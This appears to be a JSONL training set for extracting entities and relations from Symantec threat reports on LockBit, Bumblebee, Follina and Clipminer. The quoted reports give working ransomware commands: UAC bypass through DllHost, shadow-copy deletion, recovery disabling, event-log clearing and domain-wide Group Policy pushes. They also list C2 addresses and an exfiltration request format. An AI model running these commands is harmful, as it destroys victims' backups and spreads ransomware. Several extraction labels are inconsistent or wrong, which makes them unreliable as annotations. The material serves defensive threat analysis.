DLLHost.exe)"}
{"instruction": "LockBit injects code into dllhost.exe with CLSIDs of COM objects, which runs the following command to bypass UAC: A. Exploiting USERENV.dll to bypass UAC C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E} B. Bypass method in hfiref0x\u2019s UACME C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} C. Exploiting the ICMLuaUtil elevated COM Interface-Object C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} 6. LockBit creates a copy of itself under the SYSVOL directory \u201cc:\\windows\\sysvol\\domain\\scripts\\< Lockbit executable>\u201d 7. Creating a Group Policy: Once the malware identifies it is running as an admin user and a domain controller is installed on the system, it creates a Group Policy to stop services, end processes, and copy LockBit etc. Under the \u201c C:\\Windows\\SYSVOL\\domain\\Policies\\<policy GUID> \u201d folder, LockBit creates XML files that are required for the Group Policy. Computer configurations: It first creates a policy to turn off Windows Defender, suppress all notifications, disable file submissions, turn off real-time protection etc. It then maps the network drive through Group Policy.", "input": null, "output": "Named Entities: (LockBit, malware), (dllhost.exe, file), (USERENV.dll, file)\n\nRelationships: (LockBit, injects code into, dllhost.exe), (LockBit, bypass UAC using, USERENV.dll)"}
{"instruction": "Disables services related to SQL server at startup. User Configurations: The malware copied the ransomware from SYSVOL to the Desktop directory. It then creates a scheduled task to end the list of processes previously mentioned. Figure 3.Group Policy XML file used to copy LockBit from the shared SYSVOL location to client\u2019s desktop location. Figure 4. Group Policy created by LockBit can be seen in the Group Policy Management console. Figure 5. Group Policy details to disable Defender and several additional options. Figure 6. Group Policy used to map network drives. Figure 7. Group Policy used to disable SQL services at startup. Figure 8 Group Policy used to copy LockBit from the SYSVOL shared location to the desktop. Figure 9. Group Policy used to end processes using the taskkill command. Figure 10. Group Policy used to execute the LockBit ransomware. 8. Lateral movement:", "input": null, "output": "No related entities and relations."}
{"instruction": "LockBit launches powershell.exe to run the command shown below in order to search through all the computers on the Active Directory. For each host it uses the GPUpdate force command (gpupdate) to apply the newly created Group Policy. powershell.exe. exe -Command \"Get-ADComputer -filter * -Searchbase 'DC=symcdemos,DC=local' | foreach{ Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}\" 9. Executes gpupdate command on the domain controller where LockBit is running. Also runs gpupdate to run policies from the computer configurations and user configurations. gpupdate.exe /target:computer /force gpupdate.exe /target:user /force 10. Firewall LockBit reads firewall rules using the Windows Defender Firewall with Advanced Security API's \u201c FwPolicy2 \u201d object. The following CLSID COM object is called: C:\\Windows\\system32\\DllHost.exe /Processid:{E2B3C97F-6AE1-41AC-817A-F6F92166D7DD} 11. Impact LockBit attempts to delete shadow copies using VSSADMIN and WMIC . It also tries to disable recovery using the BCDEdit command.", "input": null, "output": "Named Entities: (LockBit, malware), (powershell.exe, file), (gpupdate, tool)\n\nRelationships: (LockBit, launch, powershell.exe), (powershell.exe, run, gpupdate)"}
{"instruction": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no Deletes Windows event logs using: wevtutil cl security wevtutil cl system wevtutil cl application 12. Encrypts files and appends the .lockbit file extension. 13. MSHTA.exe Creates the file lockbit.hta and executes it to display a ransom note. Figure 11. LockBit ransom note. LockBit has been one of, if not the most active of RaaS gangs in 2022. The drop in Conti activity in May helped LockBit reach the top spot, with some reports stating that the threat was behind as much as 40% of ransomware attacks .", "input": null, "output": "Named Entities: (cmd.exe, file), (MSHTA.exe, file), (lockbit.hta, file), (LockBit, malware), (Conti, malware)\n\nRelationships: (MSHTA.exe, technique, lockbit.hta)"}
{"instruction": "LockBit\u2019s success is also due to its developers and affiliates continued evolution of features and tactics, which include the malware\u2019s fast encryption speed , ability to target both Windows and Linux machines , its brash recruitment drives , and high-profile targets . In addition, as previously mentioned, the launch of a rewards program for vulnerabilities in LockBit\u2019s code and for suggestions on improving the RaaS operation will no-doubt help the ransomware remain a serious threat to organizations.", "input": null, "output": "Named Entities: (LockBit, malware), (RaaS operation, threat type)\nRelationships: (LockBit,  improve, RaaS operation)"}
{"instruction": "Bumblebee: New Loader Rapidly Assuming Central Position in Cyber-crime Ecosystem", "input": null, "output": "Named Entities: (Bumblebee, malware)\nRelationships: No related entities and relations."}
{"instruction": "New malware has links with multiple threat actors, including several high-profile ransomware operations. \nBumblebee, a recently developed malware loader, has quickly become a key component in a wide range of cyber-crime attacks and appears to have replaced a number of older loaders, which suggests that it is the work of established actors and that the transition to Bumblebee was pre-planned. \nBy analysis of three other tools used in recent attacks involving Bumblebee, Symantec\u2019s Threat Hunter team, a part of Broadcom Software , has linked this tool to a number of ransomware operations including Conti, Quantum, and Mountlocker. The tactics, techniques, and procedures (TTPs) used in these older attacks support the hypothesis that Bumblebee may have been introduced as a replacement loader for Trickbot and BazarLoader, since there is some overlap between recent activity involving Bumblebee and older attacks linked to these loaders.", "input": null, "output": "Named Entities: (Bumblebee, malware), (ransomware, threat type), (Conti, malware), (Quantum, malware), (Mountlocker, malware), (Trickbot, malware), (BazarLoader, malware)\nRelationships: (Bumblebee, linked to, Conti), (Bumblebee, linked to, Quantum), (Bumblebee, linked to, Mountlocker), (Bumblebee, introduced as replacement for, Trickbot), (Bumblebee, introduced as replacement for, BazarLoader)"}
{"instruction": "Bumblebee and Quantum: Bumblebee\u2019s role in ransomware delivery A recent attack involving the Quantum ransomware demonstrates how Bumblebee is now being leveraged by attackers to deliver ransomware. The initial infection vector was a spear-phishing email with an attachment containing an ISO file. This ISO file contained a Bumblebee DLL file and an LNK file, which loaded the Bumblebee DLL file using rundll32.exe. rundll32.exe teas.dll,kXlNkCKgFC Bumblebee supports multiple commands like \u201cIns\u201d for bot persistence, \u201cDij\u201d for DLL injection, and \u201cDex\u201d for downloading executables. Bumblebee contacted a command-and-control (C&C) server (45.153.243.93) and created a copy in the %APPDATA% folder with a random name, and also created a VBS file at the same location to load the %APPDATA% DLL file. A scheduled task was created using the Bumblebee \u201cIns\u201d command to run a VBS file every 15 minutes. wscript.exe CSIDL_COMMON_APPDATA\\e147c18f9167cd0f\\f30b25c870238567.vbs CSIDL_SYSTEM\\rundll32.exe\" CSIDL_COMMON_APPDATA\\e147c18f9167cd0f\\f30b25c870238567.dll", "input": null, "output": "Named Entities: (Bumblebee, malware), (Quantum, malware), (spear-phishing email, tool), (rundll32.exe, file), (C&C server, tool) (45.153.243.93, IP), (wscript.exe, file)\n\nRelationships: (Bumblebee, deliver, Quantum), (Bumblebee, use, spear-phishing email), (spear-phishing email, contain, rundll32.exe), (Bumblebee, contact, C&C server), (C&C server, ip, 45.153.243.93), (Bumblebee, run, wscript.exe)"}
{"instruction": "After a couple of hours, Bumblebee used the \u201cDex\u201d command to drop and run a Cobalt Strike payload named \u201cwab.exe\u201d in the %APPDATA% location. It also ran the \u201csysteminfo\u201d command. wmiprvse.exe --> wab.exe wmiprvse.exe --> wab.exe --> cmd.exe /C systeminfo Using the \u201cDij\u201d command, Bumblebee then injected the Metasploit DLL into the legitimate process \u201cImagingDevices.exe\u201d, which is a Windows Photo Viewer executable file. In addition to this, using the \u201cDij\u201d command Bumblebee injected the Cobalt Strike payload into the legitimate \u201cwab.exe\u201d, which is a Windows Mail executable file. Bumblebee then dropped the AdFind tool using the \u201cDij\u201d command and tried to enumerate domain-related information like domain trust, domain users, domain groups, and group permissions, etc. At this point, Bumblebee dropped the Quantum ransomware using the \u201cDij\u201d command. The attacker used both DLL and EXE payloads to encrypt files. rundll32.exe CSIDL_COMMON_APPDATA\\2429189468.dll,start \\shareall \\nolog CSIDL_COMMON_APPDATA\\2431789750.exe /shareall /NOLOG", "input": null, "output": "Named Entities: (Bumblebee, malware), (wab.exe, file), (wmiprvse.exe, file), (cmd.exe, file), (Metasploit DLL, tool), (ImagingDevices.exe, file), (AdFind tool, tool), (Quantum ransomware, malware), (rundll32.exe, file), (CSIDL_COMMON_APPDATA\\2429189468.dll, file), (CSIDL_COMMON_APPDATA\\2431789750.exe, file)\n\nRelationships: (Bumblebee, run, wab.exe), (wab.exe, run, cmd.exe), (Bumblebee, inject, Metasploit DLL), (Metasploit DLL, into, ImagingDevices.exe), (Bumblebee, drop, AdFind tool), (Bumblebee, drop, Quantum ransomware), (Bumblebee, use, rundll32.exe), (rundll32.exe, run, CSIDL_COMMON_APPDATA\\2429189468.dll)"}
{"instruction": "Quantum collects system information and user information using WMI. It also checks for SQL-related services and stops them if found running. Quantum also checks for some processes related to malware analysis like procmon, wireshark, cmd, task manager, and notepad, and terminates them if found running.", "input": null, "output": "Named Entities: (Quantum, malware), (WMI, tool)\nRelationships: (Quantum, use, WMI)"}
{"instruction": "Link 1: The AdFind connection Tools used in recent Bumblebee attacks have appeared in older attacks, pre-dating Bumblebee\u2019s appearance. In a number of attacks involving Bumblebee beginning in mid-May 2022, a version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) was also deployed by the attackers. AdFind is a publicly available tool for querying Active Directory and has been widely used by a range of threat actors in recent years. Similar to the previously mentioned example, malicious ISO files attached to phishing emails were the initial infection vector, with the attackers deploying legitimate ConnectWise remote desktop software (formerly known as ScreenConnect), along with Atera, another legitimate remote access tool, and Meterpreter, a Metasploit in-memory payload that provides a reverse shell to the attacker. In all cases, the attacks never reached the payload stage. However, similarities TTPs used in other attacks suggest that ransomware was the intended payload.", "input": null, "output": "Named Entities: (AdFind, tool), (Bumblebee, malware), (b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682, SHA256), (ConnectWise, tool), (ScreenConnect, tool), (Atera, tool), (Meterpreter, tool), (Metasploit, tool), (ransomware, threat type)\n\nRelationships: (Bumblebee, use, AdFind),(AdFind, hash, b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682), (Bumblebee, deploy, ConnectWise), (Bumblebee, deploy, Atera), (Bumblebee, deploy, Meterpreter), (Bumblebee, intended payload, ransomware)"}
{"instruction": "This version of AdFind used in these recent Bumblebee attacks has appeared in attacks dating back as far as June 2021, where it was being used in conjunction with Cobalt Strike to deliver the Avaddon ransomware. In August 2021, it reappeared during an unsuccessful ransomware attack when it was used alongside a number of other legitimate software packages including AnyDesk, a publicly available remote desktop tool; Splashtop, another remote desktop tool; and 7-Zip, the publicly available archiving tool. The attack was halted before a ransomware payload could be deployed.", "input": null, "output": "Named Entities: (AdFind, tool), (Bumblebee, malware), (Cobalt Strike, tool), (Avaddon ransomware, malware), (AnyDesk, tool), (Splashtop, tool), (7-Zip, tool)\nRelationships: (AdFind, used in, Bumblebee), (AdFind, used with, Cobalt Strike), (Cobalt Strike, used to deliver, Avaddon ransomware), (AdFind, used alongside, AnyDesk), (AdFind, used alongside, Splashtop), (AdFind, used alongside, 7-Zip)"}
{"instruction": "During another abortive ransomware attack in May 2022, this variant of AdFind was also deployed. Again, the attackers used Atera in conjunction with Splashtop and AnyDesk. The widely used credential dumping tools Mimikatz and LaZagne were deployed, along with the NetScan network scanner. The attackers also made use of a PowerShell script named cve-2021-34527.ps1 that has previously been linked to Conti\u2019s leaked attack playbook. This version of AdFind also appeared in attacks involving Quantum ransomware during May 2022. The attackers also used Cobalt Strike; Ligolo, a publicly available tunneling tool created for penetration testing purposes, but which has been used by a number of espionage and ransomware actors; ProcDump for credential dumping; along with Rclone, a legitimate open-source tool that can legitimately be used to manage content in the cloud, but is frequently used by ransomware actors to exfiltrate data.", "input": null, "output": "Named Entities: (AdFind, malware), (Atera, tool), (Splashtop, tool), (AnyDesk, tool), (Mimikatz, tool), (LaZagne, tool), (NetScan, tool), (PowerShell script, tool), (cve-2021-34527.ps1, file), (Conti, malware), (Quantum ransomware, malware), (Cobalt Strike, tool), (Ligolo, tool), (ProcDump, tool), (Rclone, tool)\nRelationships: (AdFind, deployed in, ransomware attack), (attackers, used, Atera), (attackers, used, Splashtop), (attackers, used, AnyDesk), (attackers, used, Mimikatz), (attackers, used, LaZagne), (attackers, used, NetScan), (attackers, used, PowerShell script), (PowerShell script, named, cve-2021-34527.ps1), (AdFind, appeared in, Quantum ransomware), (attackers, used, Cobalt Strike), (attackers, used, Ligolo), (attackers, used, ProcDump), (attackers, used, Rclone)"}
{"instruction": "More recently, this same version of AdFind was used in an attack attempting to deliver the Diavol payload. The initial loader used by the attackers was not discovered, but the AdFind link with Bumblebee activity suggests it may have been used by the attackers.", "input": null, "output": "Named Entities: (AdFind, tool), (Diavol, malware), (Bumblebee, malware)\nRelationships: (AdFind, deliver, Diavol), (AdFind, link with, Bumblebee)"}
{"instruction": "Link 2: adf.bat In early June 2022, Bumblebee was used in a thwarted attack. Although the payload wasn\u2019t deployed, the TTPs used suggested ransomware. The attackers made use of a batch script called adf.bat (SHA256: 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb) along the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682) and another version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda). This adf.bat script has been used in attacks since at least 2021. In September 2021, for example, the file was deployed in what appeared to be an attempted ransomware attack. It was used in conjunction with the previously mentioned version of AdFind (SHA256: b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682); Cobalt Strike; and PowerSploit, an exploitation framework originally developed for penetration testing.", "input": null, "output": "Named Entities: (Bumblebee, malware), (ransomware, threat type), (adf.bat, file), (1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb, SHA256), (AdFind, tool), (b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682, SHA256), (9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda, SHA256), (Cobalt Strike, tool), (PowerSploit, tool)\n\nRelationships: (Bumblebee, suggested, ransomware), (adf.bat, used in, Bumblebee), (adf.bat, hash, 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb), (adf.bat, used in, ransomware attack), (adf.bat, used in, Bumblebee), (adf.bat, used with, AdFind), (AdFind, hash, b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682), (AdFind, hash, 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda), (adf.bat, used with, AdFind), (adf.bat, used with, Cobalt Strike), (adf.bat, used with, PowerSploit)"}
{"instruction": "The script was also used in another thwarted ransomware attack in November 2021, again alongside the previously mentioned version of AdFind. Once again the attackers used a number of publicly available tools, including Atera agent and Splashtop, along with Cobalt Strike. While the delivery mechanism wasn\u2019t uncovered, some of the infrastructure used had been previously linked to infrastructure used by BazarLoader, which along with Trickbot, was one of the primary pieces of malware used by the Miner cyber-crime group (aka Wizard Spider). Both were frequently used as part of the delivery mechanism for the group\u2019s ransomware families: Ryuk and Conti.", "input": null, "output": "Named Entities: (ransomware attack, threat type), (AdFind, tool), (Atera agent, tool), (Splashtop, tool), (Cobalt Strike, tool), (BazarLoader, malware), (Trickbot, malware), (Miner cyber-crime group, attacker), (Wizard Spider, attacker), (Ryuk, malware), (Conti, malware)\nRelationships: (ransomware attack, use, AdFind), (attacker, use, Atera agent), (attacker, use, Splashtop), (attacker, use, Cobalt Strike), (Miner cyber-crime group, aka, Wizard Spider), (Miner cyber-crime group, use, BazarLoader), (Miner cyber-crime group, use, Trickbot), (Miner cyber-crime group, use, Ryuk), (Miner cyber-crime group, use, Conti)"}
{"instruction": "Link 3: find.exe/adfind.exe A third version of AdFind (SHA256: 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda) has also been used in recent attacks involving Bumblebee. This tool has been used in ransomware attacks for at least a year. In May 2021, it was used alongside Cobalt Strike in an attempted ransomware attack against a large electronics organization. One feature of this attack was that the attackers installed a VirtualBox VM on some compromised computers. While a VM image was not retrieved, it appeared that the ransomware payload was located on the VM and ran once the operating system was fully booted. The VM likely had access to the host computer\u2019s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload wasn\u2019t identified, there were some links to both the Conti and Mountlocker ransomware operations.", "input": null, "output": "Named Entities: (find.exe, file), (adfind.exe, file), (AdFind, tool), (9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda, SHA256), (Bumblebee, malware), (Cobalt Strike, tool), (runner.exe, file), (Conti, malware), (Mountlocker, malware)\nRelationships: (AdFind, hash, 9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda), (Bumblebee, use, AdFind), (AdFind, used alongside, Cobalt Strike), (Conti, linked to, Bumblebee), (Mountlocker, linked to, Bumblebee)"}
{"instruction": "In another May 2021 attack it was again used in conjunction with Cobalt Strike in another abortive ransomware attack against an organization in the U.S. While the payload was not deployed, some of the TTPs had links to earlier Conti attacks. Also in May 2021, this version of AdFind was leveraged along with Cobalt Strike in an attack against an organization in Canada. In this case, the Conti ransomware was used.", "input": null, "output": "Named Entities: (Cobalt Strike, tool), (ransomware, threat type), (Conti, threat type), (AdFind, tool)\nRelationships: (Cobalt Strike, used in conjunction with, AdFind), (Cobalt Strike, used in conjunction with, Conti)"}
{"instruction": "Increase in use of legitimate software \nAside from Bumblebee\u2019s links to a range of ransomware attacks, another commonality between many of the attacks investigated is the preponderance of legitimate software tools now being deployed during ransomware attacks. Remote desktop tools such as ConnectWise, Atera, Splashtop, and AnyDesk frequently feature in ransomware investigations, in addition to Rclone, which is now widely leveraged for data exfiltration purposes. \nMore recently, Symantec has seen attackers using the AvosLocker ransomware leveraging PDQ Deploy in their attacks. PDQ Deploy is a legitimate software package that allows users to manage patching on multiple software packages in addition to deploying custom scripts. At least one affiliate of AvosLocker is now using it to execute malicious PowerShell commands on multiple computers on victims\u2019 networks using PowerShell Empire to deploy the AvosLocker payload.", "input": null, "output": "Named Entities: (Bumblebee, malware), (ransomware, threat type), (ConnectWise, tool), (Atera, tool), (Splashtop, tool), (AnyDesk, tool), (Rclone, tool), (AvosLocker, malware), (PDQ Deploy,tool), (PowerShell Empire, tool)\n\nRelationships: (Bumblebee, link to, ransomware attacks), (ConnectWise, feature in, ransomware), (Atera, feature in, ransomware), (Splashtop, feature in, ransomware), (AnyDesk, feature in, ransomware), (Rclone, feature in, ransomware), (attacker, use, AvosLocker), (attacker, use, PDQ Deploy), (PDQ Deploy, use, PowerShell Empire)"}
{"instruction": "The Bumblebee threat \nBumblebee\u2019s links to a number of high-profile ransomware operations suggest that it is now at the epicenter of the cyber-crime ecosystem. Any organization that discovers a Bumblebee infection on its network should treat this incident with high priority since it could be the pathway to several dangerous ransomware threats.", "input": null, "output": "Named Entities: (Bumblebee, threat type), (ransomware, threat type)\nRelationships: (Bumblebee, links to, ransomware)"}
{"instruction": "Attackers Exploit MSDT Follina Bug to Drop RAT, Infostealer", "input": null, "output": "Named Entities: (MSDT Follina Bug, vulnerability), (RAT, malware), (Infostealer, malware)\nRelationships: (MSDT Follina Bug, drop, RAT), (MSDT Follina Bug, drop, Infostealer)"}
{"instruction": "Symantec has observed threat actors exploiting remote code execution flaw to drop AsyncRAT and information stealer. \nSymantec, a division of Broadcom Software , has observed threat actors exploiting the remote code execution (RCE) vulnerability known as Follina to drop malware onto vulnerable systems just days after the flaw became public on May 27, 2022.", "input": null, "output": "Named Entities: (threat actors, attacker), (remote code execution flaw, vulnerability), (AsyncRAT, malware), (information stealer, malware)\nRelationships: (threat actors, exploit, remote code execution flaw), (remote code execution flaw, drop, AsyncRAT), (remote code execution flaw, drop, information stealer), "}
{"instruction": "What is Follina? \nFollina (CVE-2022-30190) is a vulnerability in the Microsoft Support Diagnostic Tool (MSDT) that allows remote code execution on vulnerable systems through the ms-msdt protocol handler scheme. The bug is present in all supported versions of Windows. \nThe vulnerability can be easily exploited by a specially crafted Word document that downloads and loads a malicious HTML file through Word\u2019s remote template feature. The HTML file ultimately allows the attacker to load and execute PowerShell code within Windows. The vulnerability can also be exploited through the RTF file format. \nExploiting the flaw does not require the use of macros, eliminating the need for an attacker to trick victims into enabling macros for an attack to work. \nMicrosoft has since released advisories and workarounds to mitigate the vulnerability.", "input": null, "output": "Named Entities: (CVE-2022-30190, vulnerability)\n\nRelationships: No related entities and relations."}
{"instruction": "Attackers quick to take advantage Since the details of the vulnerability started surfacing online, attackers were quick to start taking advantage of the flaw to install their payloads. Symantec has observed attackers using a similar HTML file to that used in the initial attack. Figure 1. HTML file similar to that used in initial attack When the HTML document is executed in the context of WinWord, msdt.exe gets spawned as a child process. That is because of the protocol handler entry in the registry. Figure 2. Protocol handler entry in the registry Sdiagnhost.exe is then invoked, which is the Scripted Diagnostics Native Host, and under this process the final payload process is created - in our case PowerShell. Figure 3. PowerShell is created under the Scripted Diagnostics Native Host process", "input": null, "output": "Named Entities: (WinWord, tool), (msdt.exe, file), (Sdiagnhost.exe, file), (PowerShell, tool)\nRelationships: (WinWord, spawns, msdt.exe), (Sdiagnhost.exe, invoked by, msdt.exe), (Sdiagnhost.exe, creates, PowerShell)"}
{"instruction": "Multiple attackers are using a variety of payloads at the end of successful exploitation. In one of the instances, Symantec observed the attackers deploying the remote access Trojan AsyncRAT, which had a valid digital signature. When AsyncRAT runs, it carries out the anti-analysis checks shown in Figure 4. Figure 4. AsyncRAT carries out anti-analysis checks Later, AsyncRAT collects information about the infected system, including hardware identification, user name, executed path, and operating system information, and sends it to a command-and-control (C&C) server. Figure 5. AsyncRAT collects information from the infected system AsyncRAT then waits for commands from the C&C server and executes those commands on the victim machine. Symantec has also observed attackers deploying an information stealer as a payload. The code shown in Figure 6 is a snippet from the malware, which steals information including cookies and saved login data from web browsers such as Firefox, Chrome, and Edge.", "input": null, "output": "Named Entities: (AsyncRAT, malware), (command-and-control (C&C) server, tool), (information stealer, malware)\nRelationships: (AsyncRAT, send information to, command-and-control (C&C) server)"}
{"instruction": "Figure 6. Snippet of code from information-stealing malware dropped by attackers exploiting Follina bug", "input": null, "output": "No related entities and relations."}
{"instruction": "Clipminer Botnet Makes Operators at Least $1.7 Million", "input": null, "output": "Named Entities: (Clipminer Botnet, malware)\nRelationships: No related entities and relations."}
{"instruction": "Malware used for cryptocurrency mining and clipboard hijacking. Symantec\u2019s Threat Hunter Team, a part of Broadcom Software , has uncovered a cyber-criminal operation that has potentially made the actors behind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking. The malware being used, tracked by Symantec as Trojan.Clipminer, has a number of similarities to another crypto-mining Trojan called KryptoCibule , suggesting it may be a copycat or evolution of that threat. Clipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a self-extracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension (although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminer\u2019s components.", "input": null, "output": "Named Entities: (Trojan.Clipminer, malware), (KryptoCibule, malware), (Clipminer, malware), (WinRAR, tool), (Tor network, tool)\nRelationships: (Trojan.Clipminer, similarity, KryptoCibule), (Trojan.Clipminer, spread, Trojanized downloads), (Trojan.Clipminer, connect to, Tor network)"}
{"instruction": "Clipminer has the ability to use compromised computers\u2019 resources to mine for cryptocurrency. The malware also modifies the clipboard content in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the clipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized addresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide multiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be replaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of 4,375 unique addresses of wallets controlled by the attacker.", "input": null, "output": "Named Entities: (Clipminer, malware), (cryptocurrency, threat type)\nRelationships: (Clipminer, mine for, cryptocurrency)"}
{"instruction": "Out of these, 3,677 addresses are used for just three different formats of Bitcoin addresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3 Bitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as cryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's original source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million from clipboard hijacking alone.", "input": null, "output": "No related entities and relations."}
{"instruction": "Technical analysis The infection chain begins with a self-extracting WinRAR archive (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel (CPL) file: 1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4 - m5ak8iW.cpl The dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports: GetExtensionVersion HttpExtensionProc TerminateExtension Once the sample is executed, it arranges for itself to start again in case it gets interrupted. To do so, it renames itself using the following format: C:\\Windows\\Temp\\[VARIABLE] It also creates the following registry value: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\[VARIABLE]\\\"[VARIABLE]\"=\"SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \\\"C:\\\\Windows\\\\Temp\\\\[VARIABLE].\\\"\" (Note the extra DOT at the end of the filename) Example file name: C:\\Windows\\Temp\\and.loc Example corresponding registry value: [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\zyqz \"ipbfa\"=\"SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \\\"C:\\\\Windows\\\\Temp\\\\and.loc.\\\"\" Both of these will be deleted by the sample once it successfully downloads and installs its payload. Next, the malware starts an embedded Tor client by downloading Tor consensus data : http://[HOST_IP_AND_PORT]/tor/status-vote/current/consensus.z", "input": null, "output": "Named Entities: (WinRAR archive, tool), (bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71, SHA256), (Control Panel (CPL) file, file), (1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4, SHA256), (m5ak8iW.cpl, file), (portable executable DLL, file), (C:\\Windows\\Temp\\and.loc, file),  (Tor client, tool), (http://[HOST_IP_AND_PORT]/tor/status-vote/current/consensus.z, URL)\n\nRelationships: (WinRAR archive, hash, bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71), (WinRAR archive, drop, Control Panel (CPL) file), (Control Panel (CPL) file, hash, 1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4), (Control Panel (CPL) file, name, m5ak8iW.cpl), (malware, download, Tor consensus data), (Tor consensus data, URL, http://[HOST_IP_AND_PORT]/tor/status-vote/current/consensus.z)"}
{"instruction": "Where [HOST_IP_AND_PORT] is picked from a list embedded by the sample. The malware then connects to the Tor network. Next, it collects details from the affected computer, as shown in the following example: [PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];\"Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz\";L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSystem32\\x005Crundll32.exe\",L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSysWOW64\\x005Crundll32.exe\",L\"C\\x003A\\x005CUsers\\[REDACTED]\\x005CAppData\\x005CLocal\\x005CTemp\\x005CM5aK8iW.cpL\";\"BC711 NVMe SK hynix 128GB[REDACTED];L\"Windows Defender\":61100;\"PCI\\[REDACTED]\":\"Intel(R) UHD Graphics; 630\":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG]; It then sends the following HTTP GET request to an Onion Service over Tor: http://[ONION_SERVICE_AND_PORT]/[BINARY_AS_BASE64_ENCODED] Where [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and [ONION_SERVICE_AND_PORT] is one of the following: miwia5zo4oxcj7n6:11472 6lmt3ott62q5pwae:52403 nczflpbaow2ta7ua:19155 re5sb73yb75nbkrm:33033 qwhbbp6ye2l25wv6:13927 2q3n7ycm7vxe73g6:30656 w4qjsuu5x5kwvkgu:61921 gk7jrmr5v3nw3u7m:40090 ip2djbz3xidmkmkw:53148 pvy2atf27dq2d334:2720 3wquaem4x5qylhs5:17953 niddw7jlqyc64xwc:36583 ga3zm6uelxuniyq4:60117 sv2fubnuttyzvfgl:39828 kzzuxfvchn5kb73c:21646 p2dw3umgw6qhrld3:25947 wkhipwh6fb5j5hzx:25280 ml7sphy7w3k2ge6d:12508 dvivtswsxdxsqqxa:26960 tq2srsgevhutzw42:43477 xh6pciiw6yeqz3bs:19956 xup6y7cxgjorezif:51516 lbwgagk54ww5c3nj:32284 rim3qyk3tdbt2iw3:60747 krq2qyjhfwh4trww:51499 obowq55leh2wguwg:35882 xph6exfmdo7b4tkw:38607 rs24qxgkhecjcgdn:51533 i3uhj2pyh4cwwbmy:54343 7udhxrfpz6qwvspy:31399 nwogcq7cmhth7e4x:15588 gwtpcz4n3wtkwhj4:64393 5fajnveyn2bd4nm7:5990 vcammjx7ddus5kfr:64148 42xgf6qae5wjbcva:45252", "input": null, "output": "No related entities and relations."}
